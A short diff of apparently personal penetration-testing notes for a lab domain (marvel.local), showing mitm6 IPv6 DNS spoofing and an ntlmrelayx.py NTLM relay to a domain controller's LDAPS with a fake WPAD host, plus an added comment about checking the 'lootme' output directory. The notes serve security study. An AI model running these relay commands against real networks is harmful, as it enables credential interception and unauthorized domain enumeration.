@@ -55,4 +55,5 @@ mitm6 -d marvel.local
 # Now in a different terminal setup a relay attack
 ntlmrelayx.py -6 -t ldaps://<domaincontrollerip> -wh fakewpad.marvel.local -l lootme
 
+# Once users are enumerated, look in the lootme directory it created for info
 ````
